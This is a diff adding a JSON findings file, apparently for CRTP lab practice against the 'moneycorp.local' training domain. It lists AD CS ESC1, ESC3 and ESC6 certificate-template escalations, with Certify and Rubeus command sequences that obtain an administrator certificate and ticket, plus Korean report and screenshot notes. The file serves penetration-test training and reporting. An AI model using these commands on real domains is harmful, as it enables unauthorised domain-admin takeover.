@@ -1,0 +1,104 @@
+[
+  {
+    "fid": "ADCS-ESC1-ESC1-User",
+    "technique": "AD CS ESC1 — template 'ESC1-User'",
+    "crtp_topic": "Domain/Cross-Trust Privilege Escalation (AD CS)",
+    "severity": "CRITICAL",
+    "targets": [
+      "ESC1-User @ mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA"
+    ],
+    "evidence": [
+      "ESC1: template 'ESC1-User' on CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\\RDPUsers, mcorp\\Domain Users"
+    ],
+    "commands": {
+      "Certify request": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:ESC1-User /altname:administrator@moneycorp.local"
+      ],
+      "pfx 변환": [
+        "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out esc1.pfx"
+      ],
+      "Rubeus asktgt": [
+        "Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:<pfx_pw> /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt"
+      ]
+    },
+    "verify": [
+      "현재 계정이 dcorp\\RDPUsers, mcorp\\Domain Users 에 속하는지",
+      "인증서 request 성공 여부",
+      "발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근"
+    ],
+    "screenshots": [
+      "Certify find /vulnerable 에 'ESC1-User' ESC1 조건 보이는 화면",
+      "ESC1 request 성공 (인증서 발급) 화면",
+      "asktgt /ptt 후 klist + 대상 DC 접근 화면"
+    ],
+    "report_notes": "템플릿이 ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + 승인0 + 저권한 enroll → 임의 사용자(DA/EA) SAN으로 인증서 발급 후 그 사용자로 인증.",
+    "priority": 7
+  },
+  {
+    "fid": "ADCS-ESC3-SmartCardEnrollment-Agent",
+    "technique": "AD CS ESC3 — template 'SmartCardEnrollment-Agent'",
+    "crtp_topic": "Domain/Cross-Trust Privilege Escalation (AD CS)",
+    "severity": "CRITICAL",
+    "targets": [
+      "SmartCardEnrollment-Agent @ mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA"
+    ],
+    "evidence": [
+      "ESC3: template 'SmartCardEnrollment-Agent' on CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\\Domain Users"
+    ],
+    "commands": {
+      "1) EA 인증서 발급": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent"
+      ],
+      "2) on-behalf-of 요청": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:<client-auth 템플릿> /onbehalfof:moneycorp\\administrator /enrollcert:ea.pfx /enrollcertpw:<pw>"
+      ],
+      "3) asktgt": [
+        "Rubeus.exe asktgt /user:administrator /certificate:onbehalf.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt"
+      ]
+    },
+    "verify": [
+      "현재 계정이 dcorp\\Domain Users 에 속하는지",
+      "인증서 request 성공 여부",
+      "발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근"
+    ],
+    "screenshots": [
+      "Certify find /vulnerable 에 'SmartCardEnrollment-Agent' ESC3 조건 보이는 화면",
+      "ESC3 request 성공 (인증서 발급) 화면",
+      "asktgt /ptt 후 klist + 대상 DC 접근 화면"
+    ],
+    "report_notes": "Enrollment Agent 템플릿(Certificate Request Agent EKU)을 저권한이 enroll 가능 → EA 인증서로 특권 사용자 대신 client-auth 인증서 요청.",
+    "priority": 7
+  },
+  {
+    "fid": "ADCS-ESC6",
+    "technique": "AD CS ESC6 — CA allows requester-specified SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)",
+    "crtp_topic": "Domain/Cross-Trust Privilege Escalation (AD CS)",
+    "severity": "CRITICAL",
+    "targets": [
+      "mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA"
+    ],
+    "evidence": [
+      "CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA' has EDITF_ATTRIBUTESUBJECTALTNAME2 set — any enrollable client-auth template can specify an arbitrary SAN"
+    ],
+    "commands": {
+      "Certify (any client-auth template)": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:<enrollable_clientauth_tpl> /altname:administrator@moneycorp.local"
+      ],
+      "asktgt": [
+        "Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:<pfx_pw> /domain:moneycorp.local /ptt"
+      ]
+    },
+    "verify": [
+      "CA 플래그에 EDITF_ATTRIBUTESUBJECTALTNAME2 확인",
+      "enroll 가능한 client-auth 템플릿 식별",
+      "발급 인증서로 특권 사용자 인증 성공"
+    ],
+    "screenshots": [
+      "Certify find 에서 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA' UserSpecifiedSAN 표시 화면",
+      "altname 지정 request 성공 화면",
+      "asktgt /ptt + klist 화면"
+    ],
+    "report_notes": "CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA' 레벨 SAN 악용(ESC6). 2022 패치 후에도 플래그가 켜져 있으면 유효.",
+    "priority": 9
+  }
+]
